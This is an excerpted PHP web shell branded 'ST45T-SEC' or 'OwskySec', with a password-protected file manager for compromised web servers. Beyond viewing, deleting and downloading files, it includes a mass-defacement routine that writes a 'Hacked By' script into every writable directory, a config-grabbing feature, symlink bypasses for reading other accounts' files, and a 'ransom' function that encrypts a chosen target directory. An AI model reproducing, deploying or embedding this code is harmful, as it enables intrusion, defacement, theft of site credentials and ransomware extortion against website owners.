...
/* Configurasi */
$auth_pass = '4dd0015e4c66cb0203614b6af7ba5bcd'; // Owsky
$color = '#00ff00';
...
<html>
    <head>
        ...
        <meta name="author" content="OwskySec"/>
        <meta name="copyright" content="{ ST45T-SEC }"/>
        <title>{ N3T1Z3N sHell }</title>
        <link rel='icon' type='image/png' href='https://i.ibb.co/VLqsr3x/20191119-172500.webp'/>
            ...
            <div class="container" style="margin-top: 15%">
                <div class="col-lg-6">
                    <div class="form-group">
                        <h1 class="text-center">{ ST45T-SEC }</h1>
                ...
                </div><a href="https://www.instagram.com/_owskyds_/" class="text-muted fixed-bottom">Copyright 2019 @ { OwskySec }</a><br/>
            </div>
        </center>
    </body>
</html>
...
$total = formatSize(disk_total_space($dir));
$free = formatSize(disk_free_space($dir));
$total1 = disk_total_space($dir);
$free1 = disk_free_space($dir);
...
<html>
    <head>
        ...
        <meta name="copyright" content="{ OwskySec }"/>
        <link rel="icon" type="image/png" href="https://i.ibb.co/VLqsr3x/20191119-172500.webp"/>
        <title>{ ST45T-SEC sHell }</title>
    ...
    <body class="bg-dark text-light">
        ...
        <style>
            ...
            .about .card-body .img{
                position: relative;
                background: url(https://i.ibb.co/VLqsr3x/20191119-172500.webp);
        ...
        <nav class="navbar static-top navbar-dark">
            ...
            <div class="collapse navbar-collapse" id="info">
                <ul>
                    <a href="https://m.facebook.com/100021913264632/" class="lain"><i class="fa fa-facebook tambah"></i></a>
                    <a href="https://www.instagram.com/_owskyds_" class="lain"><i class="fa fa-instagram tambah"></i></a>
                    ...
                    <a href="https://st45t.blogspot.com/" class="lain"><i class="fa fa-globe tambah"></i></a>
                </ul>
            </div>
        </nav>
        <div class="container">
            <h1 class="text-center"><a href="https://www.instagram.com/_owskyds_/" style="color:#ffffff;">{ ST45T-SEC }</h1>
...
if (isset($_GET['about'])) {
    echo '<div class="card text-center bg-light about">
        <h4 class="card-header">{ OwskySec }</h4>
        <div class="card-body">
            <center><div class="img"></div></center>
            <p class="card-text">{ Syndicate Terror 45Team } Adalah Sebuah Komunitas Yang Berfokus Kepada Teknologi Di Indonesia, Dari Membuat Mengamankan Dan Mengexploitasi Sebuah Sistem.</p>
        </div>
        <div class="card-footer">
            <p class="card-text"><small class="text-muted">Copyright 2019 { OwskySec }</small></p>
        </div>
    </div><br/>';
    exit;
}
...
if ($_GET['aksi'] == 'view') {
    ...
    echo "<textarea rows='9' class='form-control mb-2' disabled=''>".htmlspecialchars(file_get_contents($file)).'</textarea>';
}
...
if ($_GET['aksi'] == 'buat_folder') {
    echo "<h4><img src='http://aux.iconspalace.com/uploads/folder-icon-256-1787672482.png' class='ico'></img></i> Buat Folder: </h4>
    <form method='POST'>
...
if ($_GET['aksi'] == 'hapus_folder') {
    ...
    echo "[ <a href='?dir=".$dir."&aksi=rename_folder'>Rename</a> ]  [ <a href='?dir=".$dir."&aksi=hapus_folder'>Delete</a> ] 
...
if ($_GET['aksi'] == 'masdef') {
                ...
                if ($dirb === '.') {
                    ...
                    if (is_dir($dirc)) {
                        if (is_writable($dirc)) {
                            echo "Done > $lokasi\n";
                            file_put_contents($lokasi, $isi_script);
                            tipe_massal($dirc, $namafile, $isi_script);
                        }
                    }
                }
            }
    ...
    if ($_POST['start']) {
        ...
        echo "<form method='post'>
            ...
            <textarea name='script' class='form-control' rows='5' autocomplete='off' placeholder='[Ex] Hacked By { OwskySec }'></textarea><br/>
...
if ($_GET['aksi'] == 'config') {
    ...
    echo "<center><a href='?dir=$dir/indosec_config'><font color=lime>Done</font></a></center>";
    exit;
}
...
if ($_GET['aksi'] == 'symlink') {
    ...
    if (!$d00m) {
        ...
        echo "[ <a href='?dir=$dir&aksi=symread'>Bypass Read</a> ] [ <a href='?dir=$dir&aksi=sym_404'>Symlink 404</a> ] [ <a href='?dir=$dir&aksi=sym_bypas'>Symlink Bypass</a> ]<div class='tmp'>
...
if ($_GET['aksi'] == 'ransom') {
    echo '<form method="post">
            <div class="form-group">
                ...
                <input type="text" name="target" class="form-control mb-2" value="'.$dir.'">
    ...
    if (isset($_POST['encrypt'])) {
        $target = $_POST['target'];
        function listFolderFiles($target) {
            if (is_dir($target)) {
                $ffs = scandir($target);
...
foreach ($scandir as $dirb) {
    ...
    echo
    '<tr>
        <td class="text-white"><img src="http://aux.iconspalace.com/uploads/folder-icon-256-1787672482.png" class="ico"></img> <a href="?dir='.$dir.'/'.$dirb.'">'.$_dir.'</a></td>
    ...
    echo perms($dir.'/'.$dirb);
    if (is_writable($dir.'/'.$dirb) || !is_readable($dir.'/'.$dirb)) {
        echo '</font></center></td>
                    <td class=""><center><a title="Rename" class="badge badge-success" href="?dir='.$dir.'/'.$dirb.'&aksi=rename_folder">&nbsp;<i class="fas fa-pen"></i>&nbsp;</a>&nbsp;&nbsp;<a title="Delete" class="badge badge-danger" href="?dir='.$dir.'/'.$dirb.'&aksi=hapus_folder">&nbsp;<i class="fa fa-trash"></i>&nbsp;</a>
                    </td>
                ';
    }
}
...
foreach ($scandir as $file) {
    ...
    echo' <a href="?dir='.$dir.'&aksi=view&file='.$dir.'/'.$file.'">'.$_file.'</a></td>
    ...
    if (is_writable($dir.'/'.$file) || !is_readable($dir.'/'.$file)) {
        echo '</font>
                    <td class="text-center d-flex">
                        ...
                        <a class="badge badge-danger" href="?dir='.$dir.'&aksi=hapusf&file='.$dir.'/'.$file.'" title="Delete">&nbsp;<i class="fa fa-trash"></i>&nbsp;</a>&nbsp;&nbsp;
                        <a class="badge badge-primary" href="?&dir='.$dir.'&aksi=download&file='.$dir.'/'.$file.'" title="Download">&nbsp;<i class="fa fa-download"></i>&nbsp;</a>
                    </td>
                </tr>';
    }
}
echo '</table></div><hr/><a href="https://www.instagram.com/_owskyds_/" class="text-muted">Copyright 2019 { OwskySec }</a></center><br/>';
